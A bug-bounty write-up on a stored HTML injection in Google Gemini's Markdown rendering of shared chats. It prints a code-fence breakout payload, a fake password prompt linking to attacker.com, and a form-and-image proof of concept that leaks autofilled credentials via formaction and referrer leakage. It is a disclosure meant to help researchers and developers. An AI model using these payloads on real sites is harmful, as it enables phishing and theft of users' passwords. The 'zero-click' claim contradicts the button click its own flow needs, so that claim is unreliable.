title: "Stored HTML Injection in Google Gemini: From Markdown Abuse to Credential Theft"
date: 19 November 2025
category: HTML Injection, Markdown Bypass, Phishing
program: Google VRP

---

On July 4, 2025, I discovered a critical stored HTML injection vulnerability in Google Gemini that allowed attackers to inject arbitrary HTML through improperly sanitized Markdown rendering. This vulnerability enabled sophisticated phishing attacks through Gemini's chat sharing feature, ultimately earning recognition from Google's VRP panel with a reward of **$13,337** for its high exploitation likelihood and abuse-related impact.

---

## Vulnerability Overview

The vulnerability stemmed from inadequate sanitization of Markdown input in Gemini's chat interface. By crafting payloads with prematurely closed code blocks and raw HTML tags, attackers could break out of Markdown formatting constraints and inject malicious HTML that persisted when shared via Gemini's official share links.

### Key Details

- **Type:** Stored HTML Injection via Markdown sanitization bypass
- **Attack Vector:** Malicious payload embedded in shared chat conversations
- **Trigger Condition:** Victim opens shared Gemini chat link
- **Persistence:** Payload stored server-side and rendered on every visit
- **User Interaction:** Minimal - only requires clicking a shared link
- **Reward:** $13,337

## Technical Analysis

### The Vulnerability

Gemini's Markdown renderer failed to properly sanitize HTML-like content within code blocks. The application appeared to process Markdown by injecting URLs and content into code blocks, but the sanitization layer could be bypassed using prematurely terminated code fence markers.

#### Payload Structure:

```markdown
\```
  test
\```
\```
\````

<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; ...">
    <!-- Malicious HTML content -->
</div>
```

The payload exploited a parsing inconsistency where the Markdown processor would close the code block early, allowing subsequent HTML to render directly in the DOM without escaping.

### Evolution of the Bug

Initially, limited HTML injection was possible using specific tags like the `immersive` tag within Markdown code blocks. However, after a platform update, the vulnerability expanded to allow direct HTML injection without requiring specific wrapper elements. This regression introduced the more severe exploitation path.

## Attack Scenarios

### UI Spoofing for Social Engineering

The most straightforward exploitation created fullscreen overlays mimicking Google's security prompts:

```html
<div style="
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: #f9d6d5;
    z-index: 9999;
">
    <h1>Security Verification Required</h1>
    <p>To protect your account, please confirm the beginning of your password:</p>
    <div>
        <a href="https://attacker.com/leak?answer=abc">abc</a>
        <a href="https://attacker.com/leak?answer=123">123</a>
        <a href="https://attacker.com/leak?answer=password">password</a>
        <a href="https://attacker.com/leak?answer=other">Other</a>
    </div>
</div>
```

This approach leveraged Google's brand trust to convince users they were interacting with a legitimate security workflow.

### Advanced Credential Exfiltration via Browser Autofill

During my research, I discovered a more sophisticated attack chain that exploited browser autofill behavior in combination with CSP bypass techniques:

#### Attack Flow:

1. **Form Injection:** Inject legitimate-looking input fields with `type="text"` and `type="password"` attributes
2. **Autofill Trigger:** Modern browsers (Chrome, Edge, Firefox) automatically populate saved credentials into these fields
3. **Exfiltration via formaction:** Use the `formaction` attribute on submit buttons to override form action despite CSP `form-action` restrictions
4. **Silent Data Leak:** Deploy invisible `<img>` tags with `referrerpolicy="unsafe-url"` to leak query parameters containing autofilled credentials

#### Critical Detail - Firefox Behavior:

Firefox prioritizes inline `referrerpolicy` attributes over server-set Referrer-Policy headers. This meant that even with proper headers, Firefox would leak the full URL (including autofilled credentials in query strings) via the Referer header when loading the invisible image from an attacker-controlled domain.

#### Proof of Concept:

```html
<form>
    <input type="text" name="username" />
    <input type="password" name="password" />
    <button formaction="https://attacker.com/collect">Verify</button>
</form>
<img src="https://attacker.com/pixel.gif" 
     referrerpolicy="unsafe-url" 
     style="opacity:0; position:absolute;" />
```

When a victim opened the shared link, their browser would:
- Autofill saved credentials into the injected form
- User clicks the crafted button, adding credentials to URL query string
- Invisible image loads, sending full URL (with credentials) via Referer header to attacker's server

## Impact Assessment

### Why This Matters

**Stored Nature:** Unlike reflected XSS or self-XSS, this vulnerability persisted server-side and affected anyone who accessed the shared link.

**Zero-Click Exploitation:** Once the malicious chat was shared, victims only needed to click the link - no additional interaction required for the payload to execute.

**Platform Trust Abuse:** The attack leveraged Gemini's official sharing mechanism, making malicious links indistinguishable from legitimate shared conversations.

**Multi-Platform Exposure:** The same Markdown rendering vulnerability existed across Google's ecosystem wherever Gemini was embedded, including Google Docs and Drive.

### Security Implications

- **Credential Theft:** Direct capture of autofilled passwords through browser behavior exploitation
- **Phishing at Scale:** Ability to create convincing fake security prompts under Google's domain
- **Session Hijacking:** Potential to trigger logout flows or capture session tokens through spoofed UI elements
- **Trust Exploitation:** Users conditioned to trust google.com domains would be less suspicious

## Lessons Learned

### For Security Researchers

**Document Evolution:** The bug evolved between platform updates - tracking these changes helped demonstrate it wasn't a one-time fluke.

**Think Beyond XSS:** While CSP prevented JavaScript execution, HTML injection alone enabled high-impact exploitation through UI spoofing and browser feature abuse.

**Cross-Browser Testing:** Firefox's divergent `referrerpolicy` handling was crucial to the credential exfiltration chain - always test across browsers.

**Persistent Communication:** Following up respectfully and providing additional technical details helped the VRP panel understand the full impact.

### For Developers

**Defense in Depth:** Even with strong CSP, HTML injection can be weaponized through browser features like autofill and referrer leakage.

**Markdown Sanitization is Complex:** Libraries that render user-controlled Markdown must carefully handle edge cases around code blocks, nested structures, and HTML entity encoding.

**Test Shared Content Paths:** Features that store and reshare user content create persistent attack surfaces that deserve extra security scrutiny.

## Conclusion

This vulnerability demonstrates that even without JavaScript execution, HTML injection in trusted contexts can enable sophisticated credential theft and phishing attacks. The combination of stored persistence, zero-click exploitation, and platform trust made this a high-impact finding worthy of Google's VRP recognition.

The $13,337 reward reflects the panel's assessment of "high exploitation likelihood" and "high impact" in an abuse context.
